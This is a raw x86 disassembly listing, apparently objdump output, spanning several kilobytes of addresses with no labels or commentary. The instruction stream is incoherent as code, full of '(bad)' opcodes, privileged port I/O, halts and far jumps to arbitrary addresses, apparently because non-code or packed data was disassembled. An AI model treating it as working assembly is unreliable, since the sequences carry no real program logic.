  40b70d:	xor    eax,0xb99ec263
  40b712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b713:	pop    eax
  40b714:	or     cl,BYTE PTR [ecx]
  40b716:	out    0xe7,al
  40b718:	mov    dl,0x48
  40b71a:	int3   
  40b71b:	mov    esi,0x82b9ddf2
  40b720:	das    
  40b721:	aad    0x6e
  40b723:	xor    edx,ebx
  40b725:	lods   eax,DWORD PTR ds:[esi]
  40b726:	call   0x2219533f
  40b72b:	js     0x40b708
  40b72d:	sti    
  40b72e:	sub    edx,DWORD PTR [edi+0x7c6de0f0]
  40b734:	jne    0x40b70e
  40b736:	lea    esi,[edx-0xd4567ba]
  40b73c:	hlt    
  40b73d:	fdivr  st,st(1)
  40b73f:	ds add al,0x4f
  40b742:	pop    ecx
  40b743:	fistp  WORD PTR [esi]
  40b745:	ss push cs
  40b747:	fwait
  40b748:	int    0xcd
  40b74a:	jge    0x40b767
  40b74c:	into   
  40b74d:	cmp    eax,0xea0fa4b3
  40b752:	idiv   esp
  40b754:	stos   BYTE PTR es:[edi],al
  40b755:	imul   esp,DWORD PTR [edx],0x7c
  40b758:	adc    eax,DWORD PTR [edx-0x5ced3bfe]
  40b75e:	or     cl,ah
  40b760:	mov    ah,0x8d
  40b762:	dec    esi
  40b763:	outs   dx,DWORD PTR ds:[esi]
  40b764:	daa    
  40b765:	xchg   ebp,eax
  40b766:	inc    edx
  40b767:	adc    al,0x11
  40b769:	popa   
  40b76a:	dec    ebx
  40b76b:	cmp    ecx,edx
  40b76d:	fs lahf 
  40b76f:	ins    DWORD PTR es:[edi],dx
  40b770:	(bad)  
  40b771:	ja     0x40b7df
  40b773:	pop    eax
  40b774:	add    DWORD PTR [edi+0x7d968fd2],eax
  40b77a:	in     al,0xc
  40b77c:	inc    ebx
  40b77d:	or     dl,BYTE PTR [ebx-0x289dbaf0]
  40b783:	jbe    0x40b719
  40b785:	jnp    0x40b78e
  40b787:	jo     0x40b806
  40b789:	stos   DWORD PTR es:[edi],eax
  40b78a:	lea    ebp,[ebp+0x1]
  40b78d:	or     BYTE PTR [ebp-0x32],bl
  40b790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b792:	shl    ch,0xa
  40b795:	push   DWORD PTR [edx+esi*1-0x4a4d49a6]
  40b79c:	pop    ebx
  40b79d:	jmp    0x9a08a264
  40b7a2:	sbb    edx,edx
  40b7a4:	jp     0x40b759
  40b7a6:	ror    BYTE PTR [ebp+0xa],0x11
  40b7aa:	mov    ebx,0xbd7704c1
  40b7af:	mov    dl,0x75
  40b7b1:	pushf  
  40b7b2:	ret    0xda9e
  40b7b5:	hlt    
  40b7b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7b7:	jmp    0x556b:0xbc3b59f7
  40b7be:	dec    esp
  40b7bf:	or     esp,DWORD PTR [ebp-0x767e9a2f]
  40b7c5:	neg    DWORD PTR [ecx+0x73]
  40b7c8:	cmc    
  40b7c9:	xor    DWORD PTR ss:[esi-0x7d54a09f],0xf797c555
  40b7d4:	xchg   esp,eax
  40b7d5:	sbb    ecx,DWORD PTR [edx+0x61]
  40b7d8:	aaa    
  40b7d9:	in     al,dx
  40b7da:	gs dec ebx
  40b7dc:	pop    esi
  40b7dd:	stos   BYTE PTR es:[edi],al
  40b7de:	int    0xae
  40b7e0:	cs mov ecx,0x32b8fbd8
  40b7e6:	shr    DWORD PTR [esi+0x6e],1
  40b7e9:	inc    ecx
  40b7ea:	and    al,0x44
  40b7ec:	test   al,0x1b
  40b7ee:	mov    ah,BYTE PTR [ecx]
  40b7f0:	xchg   BYTE PTR ds:0x96292cc3,al
  40b7f6:	pop    edx
  40b7f7:	inc    ebx
  40b7f8:	mov    ch,0xae
  40b7fa:	les    eax,FWORD PTR [ecx-0x28]
  40b7fd:	(bad)  
  40b7fe:	jmp    0xcd94:0x673f909e
  40b805:	or     al,0xd1
  40b807:	and    DWORD PTR [ecx-0x59],ecx
  40b80a:	pop    ebx
  40b80b:	pusha  
  40b80c:	lock jge 0x40b851
  40b80f:	xor    al,0x5d
  40b811:	push   edx
  40b812:	jne    0x40b859
  40b814:	push   0x2dc540dd
  40b819:	push   edi
  40b81a:	or     DWORD PTR [ebx-0x7d5173e4],edi
  40b820:	sbb    eax,0x6cdf05a8
  40b825:	outs   dx,DWORD PTR ds:[esi]
  40b826:	in     eax,0xcf
  40b828:	or     ebx,DWORD PTR [edi]
  40b82a:	arpl   ax,sp
  40b82c:	dec    edi
  40b82d:	fiadd  WORD PTR [ebp+0x12]
  40b830:	mov    edx,0x9874c327
  40b835:	mov    dh,0xc4
  40b837:	add    esi,ebp
  40b839:	mov    esi,0x80cecc7c
  40b83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b83f:	mov    dh,0x14
  40b841:	inc    esp
  40b842:	dec    ecx
  40b843:	(bad)  
  40b846:	adc    ebp,DWORD PTR [edx+0x4e278639]
  40b84c:	and    ecx,DWORD PTR [ecx+eiz*8-0x4e]
  40b850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b851:	xor    ch,ah
  40b853:	sbb    edi,edi
  40b855:	lods   al,BYTE PTR ds:[esi]
  40b856:	pop    ecx
  40b857:	dec    esi
  40b858:	ds jnp 0x40b84a
  40b85b:	push   ebp
  40b85c:	mov    esp,0x37bf6a53
  40b861:	adc    al,0xb6
  40b863:	mov    bl,0xa8
  40b865:	mov    ecx,0x622033f3
  40b86a:	iret   
  40b86b:	ins    DWORD PTR es:[edi],dx
  40b86c:	and    al,0x8e
  40b86e:	hlt    
  40b86f:	dec    ebx
  40b870:	add    esp,DWORD PTR [edi+0x75e8b36f]
  40b876:	add    ah,ch
  40b878:	push   ebp
  40b879:	cs in  al,dx
  40b87b:	dec    esp
  40b87c:	push   ecx
  40b87d:	(bad)  
  40b87e:	cdq    
  40b87f:	nop
  40b880:	inc    edx
  40b881:	hlt    
  40b882:	ret    0x4ac8
  40b885:	jne    0x40b83c
  40b887:	mov    ?,esp
  40b889:	inc    ebp
  40b88a:	(bad)  
  40b88b:	mov    ebp,0xe9416b9a
  40b890:	jmp    0xe070:0xac2fbd0f
  40b897:	icebp  
  40b898:	fidiv  WORD PTR [edi-0x7]
  40b89b:	jmp    FWORD PTR [ecx-0x35]
  40b89e:	(bad)  
  40b89f:	jle    0x40b876
  40b8a1:	pop    eax
  40b8a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a3:	lds    eax,FWORD PTR [ebx+ebp*4+0x31]
  40b8a7:	retf   0xdfc3
  40b8aa:	in     al,dx
  40b8ab:	std    
  40b8ac:	xchg   ebp,eax
  40b8ad:	pop    es
  40b8ae:	xor    DWORD PTR [ebx],ebx
  40b8b0:	xchg   edi,eax
  40b8b1:	lods   eax,DWORD PTR ds:[esi]
  40b8b2:	js     0x40b843
  40b8b4:	add    eax,0x135f1d9c
  40b8b9:	adc    esp,edi
  40b8bb:	test   eax,0x6617940f
  40b8c0:	ins    BYTE PTR es:[edi],dx
  40b8c1:	sbb    bl,BYTE PTR [eax-0x32]
  40b8c4:	out    dx,eax
  40b8c5:	iret   
  40b8c6:	(bad)  
  40b8c8:	lock das 
  40b8ca:	xor    DWORD PTR [ebp+0xf],0x4255a5d5
  40b8d1:	pop    edi
  40b8d2:	lahf   
  40b8d3:	jns    0x40b8e5
  40b8d5:	retf   
  40b8d6:	lock sbb edx,DWORD PTR ds:0xb1431963
  40b8dd:	arpl   bx,dx
  40b8df:	pop    ebx
  40b8e0:	fidiv  DWORD PTR [ecx]
  40b8e2:	dec    esi
  40b8e3:	adc    esi,DWORD PTR ds:0x43c76903
  40b8e9:	adc    cl,BYTE PTR [esi+0x54]
  40b8ec:	mov    ebp,0xfe54334c
  40b8f1:	add    edx,esp
  40b8f3:	push   edi
  40b8f4:	jb     0x40b887
  40b8f6:	xchg   ecx,eax
  40b8f7:	xor    eax,0xfaf938ba
  40b8fc:	mov    edi,0x70726067
  40b901:	add    eax,0x85615f35
  40b906:	mov    ebp,DWORD PTR ss:[edx+ebp*8-0x1b37bc44]
  40b90e:	dec    ecx
  40b90f:	push   edi
  40b910:	pushf  
  40b911:	cmp    eax,0xc04d7e29
  40b916:	xor    eax,DWORD PTR [edx+0x370be72e]
  40b91c:	imul   esp,DWORD PTR [ebx-0x3f],0x1e
  40b920:	std    
  40b921:	mov    ch,cl
  40b923:	fsub   DWORD PTR [edx+eax*8-0x26]
  40b927:	aaa    
  40b928:	push   edx
  40b929:	xchg   edi,eax
  40b92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b92b:	inc    eax
  40b92c:	ins    DWORD PTR es:[edi],dx
  40b92d:	je     0x40b97d
  40b92f:	and    ah,BYTE PTR [eax+eax*4+0x3a]
  40b933:	cmp    dh,BYTE PTR [eax-0x21]
  40b936:	in     eax,0x33
  40b938:	inc    esi
  40b939:	repnz stc 
  40b93b:	and    DWORD PTR [edx],0x44586c4e
  40b941:	pop    ds
  40b942:	xchg   esi,eax
  40b943:	pop    ebx
  40b944:	jg     0x40b990
  40b946:	loopne 0x40b9a4
  40b948:	xchg   ebx,eax
  40b949:	xor    eax,0x1c8528a1
  40b94e:	jae    0x40b962
  40b950:	mov    esi,0x5f3c0e44
  40b955:	in     eax,dx
  40b956:	sub    eax,0x668e8d5b
  40b95b:	ret    0x6912
  40b95e:	(bad)
  40b961:	inc    esi
  40b962:	mov    esi,0xbf22d1f6
  40b967:	mov    ch,0x2c
  40b969:	sbb    cl,BYTE PTR [esi+0x57]
  40b96c:	push   ecx
  40b96d:	xchg   edi,eax
  40b96e:	cwde   
  40b96f:	sub    eax,ecx
  40b971:	sub    al,0x8
  40b973:	mov    esi,0x95859915
  40b978:	or     DWORD PTR [ecx],ebp
  40b97a:	push   edx
  40b97b:	lea    esp,[ebp-0x18]
  40b97e:	and    eax,0x74a04a48
  40b983:	in     eax,dx
  40b984:	rcr    DWORD PTR [ebx-0x25],1
  40b987:	call   0x3c3ba256
  40b98c:	nop
  40b98d:	das    
  40b98e:	(bad)  
  40b98f:	in     al,dx
  40b990:	aaa    
  40b991:	jae    0x40b9ac
  40b993:	outs   dx,BYTE PTR ds:[esi]
  40b994:	push   0x357c0ba0
  40b999:	dec    edx
  40b99a:	sbb    bh,dh
  40b99c:	hlt    
  40b99d:	rcl    BYTE PTR [edi-0x59],cl
  40b9a0:	fsubrp st(1),st
  40b9a2:	lods   eax,DWORD PTR ds:[esi]
  40b9a3:	(bad)  
  40b9a4:	push   esp
  40b9a5:	and    DWORD PTR [esi+0x31],esi
  40b9a8:	sub    bl,bl
  40b9aa:	dec    edx
  40b9ab:	mov    dh,BYTE PTR [ecx]
  40b9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ae:	shr    ecx,1
  40b9b0:	dec    eax
  40b9b1:	(bad)  
  40b9b2:	enter  0xed29,0xfa
  40b9b6:	ds xor al,0x99
  40b9b9:	jmp    0x71c19abe
  40b9be:	jle    0x40b9f2
  40b9c0:	mov    edi,0x1ffdd912
  40b9c5:	into   
  40b9c6:	or     DWORD PTR [eax+0x56],eax
  40b9c9:	(bad)  
  40b9cb:	fdiv   DWORD PTR [ebp-0x7a]
  40b9ce:	jne    0x40b9a9
  40b9d0:	int    0xbe
  40b9d2:	push   esp
  40b9d3:	push   edx
  40b9d4:	retf   0xc0d9
  40b9d7:	loop   0x40b95f
  40b9d9:	pop    ss
  40b9da:	sub    al,0x9e
  40b9dc:	push   0x39e293af
  40b9e1:	fistp  WORD PTR ds:0x7ececfa1
  40b9e7:	sbb    al,0x32
  40b9e9:	aad    0xe4
  40b9eb:	aaa    
  40b9ec:	cmp    eax,0xad2fd7a4
  40b9f1:	hlt    
  40b9f2:	ror    DWORD PTR [esi],cl
  40b9f4:	pop    edi
  40b9f5:	push   edx
  40b9f6:	pop    es
  40b9f7:	pop    ecx
  40b9f8:	pop    eax
  40b9f9:	push   0xd5850409
  40b9fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ff:	icebp  
  40ba00:	test   dh,cl
  40ba02:	jnp    0x40b9fa
  40ba04:	xor    esp,DWORD PTR [edx+eax*4]
  40ba07:	pop    ebx
  40ba08:	jae    0x40ba84
  40ba0a:	mov    edi,0xbf1c3b67
  40ba0f:	mov    bh,BYTE PTR [ecx]
  40ba11:	stos   BYTE PTR es:[edi],al
  40ba12:	test   BYTE PTR [esi+edi*2+0x5f],0xf
  40ba17:	mov    edx,DWORD PTR [esi+ebp*4-0x29448f0a]
  40ba1e:	rep ins DWORD PTR es:[edi],dx
  40ba20:	push   es
  40ba21:	inc    esi
  40ba22:	mov    eax,ds:0xfbfc46f
  40ba27:	shr    DWORD PTR [ecx],cl
  40ba29:	jmp    0xe82e:0x5a4a01e0
  40ba30:	cmp    eax,0x4978212e
  40ba35:	mov    eax,ds:0xd45a26ca
  40ba3a:	xor    eax,0xf5308c24
  40ba3f:	std    
  40ba40:	data16 fstp st(1)
  40ba43:	mov    dl,BYTE PTR [ebx]
  40ba45:	out    0x41,al
  40ba47:	inc    ebp
  40ba48:	test   al,0xac
  40ba4a:	pop    ss
  40ba4b:	int3   
  40ba4c:	or     esp,ecx
  40ba4e:	(bad)  
  40ba50:	js     0x40b9f5
  40ba52:	sbb    BYTE PTR [edx-0x1181fd18],bl
  40ba58:	xchg   esp,eax
  40ba59:	mov    bl,0x71
  40ba5b:	cmp    esi,DWORD PTR [edi+0x74]
  40ba5e:	or     BYTE PTR [eax+0x33],ah
  40ba61:	adc    DWORD PTR [ebx],edx
  40ba63:	out    0x36,eax
  40ba65:	in     al,0x77
  40ba67:	popf   
  40ba68:	pop    ebp
  40ba69:	inc    eax
  40ba6a:	lahf   
  40ba6b:	adc    eax,0x33a3ebd0
  40ba70:	mov    dl,0xe2
  40ba72:	push   ecx
  40ba73:	adc    al,0xbd
  40ba75:	lds    ebx,FWORD PTR [esi+eiz*4]
  40ba78:	xchg   esp,eax
  40ba79:	push   0xd521bca0
  40ba7e:	push   ebx
  40ba7f:	mov    BYTE PTR [edi+0x5e17b780],ch
  40ba85:	out    dx,al
  40ba86:	pop    es
  40ba87:	int    0xc4
  40ba89:	adc    al,0x61
  40ba8b:	aaa    
  40ba8c:	push   0xffffffe7
  40ba8e:	out    dx,al
  40ba8f:	sub    eax,0x1a2052ab
  40ba94:	ret    0x49da
  40ba97:	aad    0x26
  40ba99:	fcomp  DWORD PTR [edx+0x20]
  40ba9c:	adc    eax,0x945a5e36
  40baa1:	stos   DWORD PTR es:[edi],eax
  40baa2:	cmc    
  40baa3:	or     esp,DWORD PTR [ebp-0x2cc513d4]
  40baa9:	imul   DWORD PTR [ecx-0x4b]
  40baac:	cdq    
  40baad:	jp     0x40babc
  40baaf:	les    ebp,FWORD PTR [edi]
  40bab1:	stos   BYTE PTR es:[edi],al
  40bab2:	ins    DWORD PTR es:[edi],dx
  40bab3:	fldenv [ebx]
  40bab5:	mov    ebp,0xd1944a35
  40baba:	jge    0x40ba76
  40babc:	xchg   edx,eax
  40babd:	repnz (bad) 
  40babf:	mov    bl,0x7d
  40bac1:	mov    ah,0xc8
  40bac3:	cmp    BYTE PTR [bx+si+0x3e],0xd0
  40bac8:	jb     0x40bb1e
  40baca:	jo     0x40bad8
  40bacc:	jno    0x40bb3a
  40bace:	push   ecx
  40bacf:	fs enter 0x52a8,0x1a
  40bad4:	(bad)  
  40bad5:	in     al,dx
  40bad6:	and    al,0x37
  40bad8:	push   cs
  40bad9:	(bad)  
  40bada:	pop    esp
  40badb:	mov    esp,0x7684a873
  40bae0:	retf   
  40bae1:	sub    ebx,ecx
  40bae3:	jmp    0xbf837e0a
  40bae8:	stos   DWORD PTR es:[edi],eax
  40bae9:	and    eax,0xbe5dd134
  40baee:	mov    ds:0x68ea2333,al
  40baf3:	out    0x6d,eax
  40baf5:	lds    edi,FWORD PTR [eax]
  40baf7:	stos   BYTE PTR es:[edi],al
  40baf8:	push   esi
  40baf9:	sub    BYTE PTR [edi+0xa4bbe],al
  40baff:	push   esi
  40bb00:	popa   
  40bb01:	dec    eax
  40bb02:	or     al,0x93
  40bb04:	ror    edx,cl
  40bb06:	(bad)  
  40bb07:	and    dh,ch
  40bb09:	or     eax,0x86791570
  40bb0e:	cwde   
  40bb0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb10:	fmul   QWORD PTR [edi]
  40bb12:	sbb    ebx,esp
  40bb14:	pop    ebp
  40bb15:	xlat   BYTE PTR ds:[ebx]
  40bb16:	lods   al,BYTE PTR ds:[esi]
  40bb17:	ins    BYTE PTR es:[edi],dx
  40bb18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb19:	retf   0xeae2
  40bb1c:	jno    0x40bb37
  40bb1e:	aad    0xaa
  40bb20:	dec    esi
  40bb21:	test   al,0xb5
  40bb23:	lods   al,BYTE PTR ds:[esi]
  40bb24:	ja     0x40bae2
  40bb26:	mov    ebx,0xbcfab9b
  40bb2b:	idiv   BYTE PTR [edi+edx*2+0x46]
  40bb2f:	push   edi
  40bb30:	pop    ebx
  40bb31:	add    al,al
  40bb33:	add    al,0x78
  40bb35:	push   edi
  40bb36:	shl    DWORD PTR [edx-0x27],1
  40bb39:	mov    ds:0xd7fba9bd,al
  40bb3e:	mov    edx,0x1d6a0163
  40bb43:	ds xchg eax,edi
  40bb46:	bound  esp,QWORD PTR [esi-0x78]
  40bb49:	cld    
  40bb4a:	les    ebp,FWORD PTR [ebx]
  40bb4c:	cmp    ch,bl
  40bb4e:	sti    
  40bb4f:	cld    
  40bb50:	arpl   sp,di
  40bb52:	ss std 
  40bb54:	add    bh,BYTE PTR [ebx-0x4f]
  40bb57:	fld    QWORD PTR [ecx*1-0x43bcb146]
  40bb5e:	pop    edi
  40bb5f:	and    BYTE PTR [edi],ah
  40bb61:	aam    0x94
  40bb63:	ror    DWORD PTR [ebx-0x23],cl
  40bb66:	push   ebp
  40bb67:	cmp    BYTE PTR [edi+0x7f096420],dl
  40bb6d:	fs jnp 0x40bb84
  40bb70:	dec    DWORD PTR [edx-0x7e14fd50]
  40bb76:	pop    edx
  40bb77:	push   ss
  40bb78:	into   
  40bb79:	jge    0x40bbc5
  40bb7b:	repnz and eax,0xc101e891
  40bb81:	xbegin 0x70458cca
  40bb87:	mov    edi,0x1fd245c
  40bb8c:	in     al,dx
  40bb8d:	outs   dx,DWORD PTR ds:[esi]
  40bb8e:	jno    0x40bbcd
  40bb90:	(bad)  
  40bb91:	enter  0xdf5,0xed
  40bb95:	add    al,0x83
  40bb97:	imul   esi,ebx,0xffffffbb
  40bb9a:	aas    
  40bb9b:	and    eax,0x61e1c570
  40bba0:	jne    0x40bb7e
  40bba2:	mov    cl,0x49
  40bba4:	pop    esi
  40bba5:	add    ebp,edx
  40bba7:	loopne 0x40bb99
  40bba9:	lea    ebp,[edx-0x4d3caa55]
  40bbaf:	xor    BYTE PTR [edx-0x1d7e2b0e],ch
  40bbb5:	add    BYTE PTR [ebx],ah
  40bbb7:	hlt    
  40bbb8:	(bad)  
  40bbba:	ins    DWORD PTR es:[edi],dx
  40bbbb:	pop    edi
  40bbbc:	out    dx,eax
  40bbbd:	pop    edi
  40bbbe:	ss repnz push es
  40bbc1:	dec    ebp
  40bbc2:	push   0x36606daf
  40bbc7:	cwde   
  40bbc8:	mov    ds:0x9a5dbdd6,eax
  40bbcd:	and    BYTE PTR [esi+0x2dd60008],dl
  40bbd3:	jmp    0x6bd8:0xe7243e59
  40bbda:	or     DWORD PTR [ecx+0x6c],edx
  40bbdd:	inc    edi
  40bbde:	jbe    0x40bbb3
  40bbe0:	push   ebx
  40bbe1:	push   esp
  40bbe2:	lock fldenv [eax-0x3a]
  40bbe6:	add    BYTE PTR [esi],bl
  40bbe8:	xchg   DWORD PTR [ebx],esi
  40bbea:	fwait
  40bbeb:	add    ebp,ebp
  40bbed:	inc    ecx
  40bbee:	icebp  
  40bbef:	int    0xfd
  40bbf1:	jg     0x40bc0b
  40bbf3:	pop    ds
  40bbf4:	mov    eax,ds:0xb2bf141d
  40bbf9:	jbe    0x40bb92
  40bbfb:	fdiv   st,st(6)
  40bbfd:	add    edx,eax
  40bbff:	mov    ds:0x3f56685a,al
  40bc04:	inc    ebp
  40bc05:	jbe    0x40bbcf
  40bc07:	cmc    
  40bc08:	sbb    bh,0xc9
  40bc0b:	jne    0x40bba2
  40bc0d:	mov    BYTE PTR [ebp-0x61],0x19
  40bc11:	cld    
  40bc12:	inc    edx
  40bc13:	jge    0x40bba5
  40bc15:	pop    ebp
  40bc16:	mov    BYTE PTR [ecx-0x1a],dl
  40bc19:	mov    eax,ds:0x9f409e78
  40bc1e:	das    
  40bc1f:	mov    dh,0x17
  40bc21:	xchg   ebx,eax
  40bc22:	sar    DWORD PTR [esi-0x74c69b76],1
  40bc28:	jle    0x40bc10
  40bc2a:	adc    DWORD PTR [ebx],edi
  40bc2c:	ja     0x40bc5d
  40bc2e:	retf   
  40bc2f:	jb     0x40bc85
  40bc31:	mov    ds:0x5162d169,eax
  40bc36:	sub    esi,DWORD PTR [ebp+eax*1+0x2f0edf9b]
  40bc3d:	or     al,0xd1
  40bc3f:	ins    BYTE PTR es:[edi],dx
  40bc40:	xor    cl,BYTE PTR [edx+0x31283a38]
  40bc46:	ds mov esi,0xd008e590
  40bc4c:	sbb    eax,0x3f64e006
  40bc51:	pop    esi
  40bc52:	je     0x40bc8c
  40bc54:	push   edi
  40bc55:	daa    
  40bc56:	hlt    
  40bc57:	dec    edi
  40bc58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc59:	fisub  DWORD PTR [esi+0x50]
  40bc5c:	push   edi
  40bc5d:	stc    
  40bc5e:	outs   dx,BYTE PTR ds:[esi]
  40bc5f:	mov    al,ds:0x9cfbc65c
  40bc64:	(bad)  
  40bc65:	jp     0x40bcd9
  40bc67:	std    
  40bc68:	into   
  40bc69:	push   ds
  40bc6a:	icebp  
  40bc6b:	inc    ebx
  40bc6c:	lods   al,BYTE PTR ds:[esi]
  40bc6d:	jmp    0x40bcaf
  40bc6f:	cmp    DWORD PTR [ebx-0x530cc1c1],esi
  40bc75:	fwait
  40bc76:	mov    eax,ds:0xacfeda8e
  40bc7b:	nop
  40bc7c:	int3   
  40bc7d:	retf   
  40bc7e:	dec    esi
  40bc7f:	inc    edx
  40bc80:	sbb    ebp,edi
  40bc82:	repz pop ecx
  40bc84:	iret   
  40bc85:	pop    es
  40bc86:	jns    0x40bc78
  40bc88:	retf   
  40bc89:	push   ebx
  40bc8a:	enter  0x7ec2,0x1c
  40bc8e:	mov    ah,0x75
  40bc90:	cmp    dh,dh
  40bc92:	sahf   
  40bc93:	inc    esp
  40bc94:	nop
  40bc95:	push   edx
  40bc96:	cdq    
  40bc97:	xor    BYTE PTR [edi+0x56],ah
  40bc9a:	mov    ecx,0xd4ebe30d
  40bc9f:	mov    WORD PTR [edi+0x37],?
  40bca2:	pop    edi
  40bca3:	mov    DWORD PTR [edx+0xb027603],eax
  40bca9:	mov    bh,0x35
  40bcab:	push   esi
  40bcac:	add    ecx,0xffffffa8
  40bcaf:	pop    edi
  40bcb0:	aam    0x38
  40bcb2:	push   ebx
  40bcb3:	mov    esi,0xdf95417e
  40bcb8:	stos   BYTE PTR es:[edi],al
  40bcb9:	push   ecx
  40bcba:	mov    BYTE PTR [ecx-0x17],0x40
  40bcbe:	lea    esi,[esi+0xa]
  40bcc1:	arpl   cx,ax
  40bcc3:	neg    BYTE PTR [eax+ebp*8-0x33d9516a]
  40bcca:	mov    eax,ds:0x63b30a71
  40bccf:	pop    edx
  40bcd0:	scas   al,BYTE PTR es:[edi]
  40bcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd2:	(bad)  
  40bcd3:	lea    edx,[ebx+ebx*4-0x6aa995b5]
  40bcda:	or     esi,DWORD PTR [edx+ebp*2-0x7b]
  40bcde:	or     eax,edi
  40bce0:	adc    DWORD PTR [ebx],0xb70e989a
  40bce6:	cmp    DWORD PTR [eax-0x5d],ebx
  40bce9:	mov    edx,edx
  40bceb:	push   ebx
  40bcec:	cmp    al,0xdd
  40bcee:	push   edi
  40bcef:	xchg   esp,eax
  40bcf0:	in     al,dx
  40bcf1:	(bad)  
  40bcf2:	xlat   BYTE PTR ds:[ebx]
  40bcf3:	rol    DWORD PTR [edi-0x22],0x9e
  40bcf7:	lea    edx,ds:0x656d15d6
  40bcfd:	mov    edi,0x5e7637d5
  40bd02:	mov    dl,0xc
  40bd04:	int    0xbd
  40bd06:	add    al,0x44
  40bd08:	retf   0x11ff
  40bd0b:	mov    ch,BYTE PTR [edx-0x7af8955f]
  40bd11:	push   ebp
  40bd12:	pop    edx
  40bd13:	jmp    0x90a215a6
  40bd18:	and    al,0x2
  40bd1a:	stos   BYTE PTR es:[edi],al
  40bd1b:	push   edx
  40bd1c:	retf   
  40bd1d:	out    dx,eax
  40bd1e:	sub    DWORD PTR [ecx-0x64],0x69
  40bd22:	popf   
  40bd23:	jg     0x40bd95
  40bd25:	clc    
  40bd26:	push   es
  40bd27:	push   0x74
  40bd29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd2a:	lea    edi,[ebx]
  40bd2c:	shr    bl,0x28
  40bd2f:	xchg   esp,eax
  40bd30:	adc    cl,BYTE PTR [ebp+0x4e]
  40bd33:	sbb    dl,BYTE PTR [edi-0x5af3b025]
  40bd39:	xor    eax,0xf8b4e96
  40bd3e:	mov    esp,0x2c062290
  40bd43:	and    eax,0x1f459513
  40bd48:	js     0x40bd39
  40bd4a:	psrad  mm5,mm4
  40bd4d:	adc    eax,0xa6b584ef
  40bd52:	xor    BYTE PTR fs:[esi-0x43ebcb19],dh
  40bd59:	ds jnp 0x40bd1e
  40bd5c:	xchg   ebx,eax
  40bd5d:	int    0x2c
  40bd5f:	sub    edi,ebp
  40bd61:	pop    es
  40bd62:	mov    cl,dh
  40bd64:	inc    BYTE PTR [ebx-0x78]
  40bd67:	das    
  40bd68:	ss dec edi
  40bd6a:	enter  0x28d2,0x2d
  40bd6e:	imul   ebx,eax,0x3434b403
  40bd74:	nop
  40bd75:	cmp    BYTE PTR [ecx],al
  40bd77:	mov    edx,0xabc6a25d
  40bd7c:	cdq    
  40bd7d:	data16 stc 
  40bd7f:	push   ds
  40bd80:	mov    ecx,0x2081b9c9
  40bd85:	shl    dh,1
  40bd87:	lods   eax,DWORD PTR ds:[esi]
  40bd88:	fsubr  QWORD PTR [ebp-0x45]
  40bd8b:	test   BYTE PTR [edx+ebp*2-0x28],bl
  40bd8f:	jmp    0x8cf1:0x50edda1e
  40bd96:	or     ebp,ecx
  40bd98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd99:	mov    esi,0xab0b958d
  40bd9e:	js     0x40bdd2
  40bda0:	xor    dh,BYTE PTR [ecx+0xe481e6c]
  40bda6:	scas   al,BYTE PTR es:[edi]
  40bda7:	stc    
  40bda8:	inc    edx
  40bda9:	shl    esp,1
  40bdab:	inc    ebp
  40bdac:	test   eax,0xc2c2ae47
  40bdb1:	xchg   ebx,eax
  40bdb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb3:	mov    edi,0x82449513
  40bdb8:	dec    esp
  40bdb9:	push   0x2b51e566
  40bdbe:	mov    ebx,0x55cc4042
  40bdc3:	cmp    esi,DWORD PTR [esi+0x56]
  40bdc6:	test   BYTE PTR [edx],cl
  40bdc8:	test   BYTE PTR [ebx+0x22],bl
  40bdcb:	out    0xa7,al
  40bdcd:	iret   
  40bdce:	aam    0x3f
  40bdd0:	jp     0x40bd6d
  40bdd2:	adc    eax,0xec5746bb
  40bdd7:	mov    ecx,ebx
  40bdd9:	cmp    BYTE PTR [edx],bh
  40bddb:	imul   ebx,esp,0xffffffb3
  40bdde:	dec    edi
  40bddf:	arpl   WORD PTR [edi],cx
  40bde1:	jnp    0x40bdd8
  40bde3:	inc    edx
  40bde4:	lods   eax,DWORD PTR ds:[esi]
  40bde5:	cmp    ah,BYTE PTR [edi+0x60899d70]
  40bdeb:	test   eax,0x3eb98af3
  40bdf0:	push   ebp
  40bdf1:	mov    dl,0xfd
  40bdf3:	push   esi
  40bdf4:	aad    0xd6
  40bdf6:	pop    ds
  40bdf7:	or     eax,0x8a019338
  40bdfc:	inc    ecx
  40bdfd:	loopne 0x40be4f
  40bdff:	add    al,0xf3
  40be01:	dec    ecx
  40be02:	pop    ecx
  40be03:	xchg   esp,eax
  40be04:	stos   DWORD PTR es:[edi],eax
  40be05:	lock or eax,0x43ea9e4b
  40be0b:	adc    bl,bl
  40be0d:	inc    ebp
  40be0e:	jl     0x40bda7
  40be10:	jecxz  0x40be1e
  40be12:	and    eax,0x4a11ae5c
  40be17:	call   0x4003d4f0
  40be1c:	int    0xf1
  40be1e:	sub    al,BYTE PTR [ebp-0x4b2a22f8]
  40be24:	and    BYTE PTR [ebx+ebp*2-0x5e],bh
  40be28:	dec    edx
  40be29:	sti    
  40be2a:	cwde   
  40be2b:	jbe    0x40be22
  40be2d:	sbb    eax,0x7c333b38
  40be32:	fsub   QWORD PTR [eax+0x35a1a844]
  40be38:	idiv   DWORD PTR [ebp-0x55]
  40be3b:	aad    0xf
  40be3d:	cmp    eax,0xe6f81257
  40be42:	pop    ss
  40be43:	lods   eax,DWORD PTR ds:[esi]
  40be44:	pushf  
  40be45:	rcl    DWORD PTR [eax+0x1],1
  40be48:	std    
  40be49:	pop    ebx
  40be4a:	and    ch,bl
  40be4c:	fisub  WORD PTR [ecx-0x68]
